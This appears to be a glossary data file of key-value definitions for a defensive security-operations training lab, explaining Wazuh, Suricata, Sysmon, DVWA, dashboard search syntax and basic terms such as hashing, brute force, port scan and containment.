glossary.Suricata: An open-source network intrusion detector that watches traffic and raises alerts.
glossary.Sysmon: A Windows tool that records detailed activity — processes, connections, file changes.
glossary.DVWA: Damn Vulnerable Web App — a deliberately insecure web app used as a safe attack target.
glossary.nmap: A scanner that finds open ports and what software is running on them.
glossary.nikto: A scanner that checks a web server for known issues.
glossary.MITRE ATT&CK: A public catalogue of attacker techniques, used to describe how an attack was carried out.
glossary.MTTD: Mean Time To Detect — the average time from an attack starting to it being noticed.
glossary.MTTR: Mean Time To Respond — the average time from detecting an attack to containing it.
glossary.rule.level: Wazuh scores every alert 0–15 by severity; searching rule.level:>=7 keeps the ones that usually matter.
glossary.rule.groups: The category tags Wazuh puts on an alert (e.g. authentication_failed, ids, web) — handy for filtering by attack type.
glossary.agent.name: The Wazuh field naming which machine an alert came from (e.g. Team07-ubuntu) — use it to filter to one host.
glossary.event channel: A named Windows log stream — Sysmon writes to Microsoft-Windows-Sysmon/Operational, which the agent forwards.
glossary.Emerging Threats ruleset: The community alert rules Suricata downloads with suricata-update — without them it sees traffic but raises nothing.
glossary.DQL: Dashboard Query Language — the field:value search syntax in the Wazuh/OpenSearch search bar (e.g. data.src_ip:10.10.30.7).
glossary.Discover: The Wazuh/OpenSearch view that lists raw events in a table you can search, add columns to, and save.
glossary.time picker: The date/time control (top-right) that sets which window of events you see — the #1 reason a correct search looks empty.
glossary.visualization: A saved chart (bar, pie, table) built from a search — the building block you drop onto a dashboard.
glossary.dashboard: A saved page of visualizations and searches you assemble to watch at a glance.
glossary.rule.description: The Wazuh field holding the human-readable name of the rule that fired — useful to group and count alerts by.
glossary.syscheck: Wazuh’s File Integrity Monitoring engine; its events carry syscheck.path and whether a file was added/modified/deleted.
glossary.sensor: A program on a machine that watches activity and reports it to the SOC — your Wazuh agent, Suricata and Sysmon are all sensors.
glossary.endpoint: Any individual computer on the network — a laptop, server or VM — as opposed to the network gear between them.
glossary.telemetry: The stream of activity data a machine sends about itself — processes, logins, connections — that the SOC watches.
glossary.hash: A short fingerprint calculated from a file; change one byte and the fingerprint changes, so it proves the file was not tampered with.
glossary.hashing: Running a file through a formula to get its fixed-length fingerprint (its hash).
glossary.SHA-256: A widely trusted hashing method that turns any file into a 64-character fingerprint.
glossary.false positive: An alert that turned out to be harmless — the tool flagged something that was not actually an attack.
glossary.true positive: An alert that was real — the flagged activity really was malicious.
glossary.enroll: To register a machine with the SOC so its agent starts sending logs.
glossary.brute force: Guessing a password by automatically trying huge numbers of combinations until one works.
glossary.port scan: Probing a machine to list which network ports are open, to discover what services it is running.
glossary.SSH: Secure Shell — a way to log in to and run commands on another machine over the network, from your terminal.
glossary.pivot: To follow a clue (like an IP or username) from one log into related events, tracing an attacker’s movements.
glossary.hardening: Making a machine harder to attack by closing unused services, fixing weak settings and applying updates.
glossary.containment: Stopping an attack from spreading — e.g. isolating the affected machine — once you have detected it.
glossary.vulnerability: A weakness in software or configuration that an attacker could exploit.
glossary.vuln: Short for vulnerability — a weakness an attacker could exploit.
glossary.firewall: A filter that allows or blocks network connections by rule, to keep unwanted traffic out.
glossary.ufw: Uncomplicated Firewall — the simple command-line firewall on Ubuntu (e.g. ufw allow 22).
